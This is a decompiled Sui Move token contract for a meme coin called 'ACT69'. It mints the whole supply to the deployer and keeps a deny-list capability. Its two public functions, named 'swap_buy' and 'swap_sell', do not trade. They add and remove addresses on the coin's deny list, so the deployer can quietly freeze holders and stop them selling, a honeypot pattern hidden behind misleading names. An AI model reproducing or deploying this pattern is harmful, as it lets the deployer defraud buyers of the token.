module 0xb48379da42eff5561e01d942addec6d3856e49076ba0bf1a5092df30d38da493::act69 {
    struct ACT69 has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: ACT69, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<ACT69>(arg0, 9, b"ACT69", b"ACT69: The Nut", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmRcGWXo45cHTR1pfEKYsrXPgUDxjzPSHxXPGtX1S2cDCP"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<ACT69>(&mut v3, 690000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<ACT69>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<ACT69>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<ACT69>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<ACT69>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<ACT69>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<ACT69>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<ACT69>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

